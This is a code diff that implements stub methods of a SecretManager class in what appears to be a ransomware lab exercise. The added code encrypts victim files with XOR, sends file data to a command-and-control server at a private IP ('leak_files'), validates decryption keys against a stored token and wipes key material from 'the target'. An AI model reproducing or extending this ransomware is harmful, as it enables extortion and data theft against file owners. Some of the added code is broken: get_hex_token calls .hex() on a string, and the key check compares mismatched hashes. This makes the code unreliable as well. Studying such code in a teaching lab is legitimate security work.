@@ -7,7 +7,6 @@ import os.path
 import requests
 import base64
 
-
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from xorcrypt import xorfile
@@ -96,16 +95,23 @@ class SecretManager:
             self._token = f.read()
         
     def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
+        token = self.get_hex_token()        # get the token 
+        if sha256(candidate_key).hexdigest() == token:         # check if the token is valid
+            return True
+        else:
+            return False
 
     def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+        key = base64.b64decode(b64_key) # decode the key
+        self._key = key
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+        with open(os.path.join(self.TOKEN_PATH, "token.bin"), "rb") as f:
+            token = f.read()
+            # hash the token
+            token = sha256(token).hexdigest()
+        return token.hex()
 
     def xorfiles(self, files:List[str])->None:
         for file in files:
@@ -113,9 +119,24 @@ class SecretManager:
 
 
     def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        raise NotImplemented()
-
+        data = files 
+        requests.post("http://172.19.0.2:6666/files", json=data)
+        return {"status": "ok"}
+    
     def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+        # rewrite and remove crypto data from the target
+        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
+        self._key = None
+        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
+        self._salt = None
+        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
+        self._token = None
+
+
+if __name__ == "__main__":
+    # Test the class
+    secret_manager = SecretManager()
+    secret_manager.setup()
+    secret_manager.xorfiles(["test.txt"])
+    secret_manager.leak_files(["test.txt"])
+    secret_manager.clean()
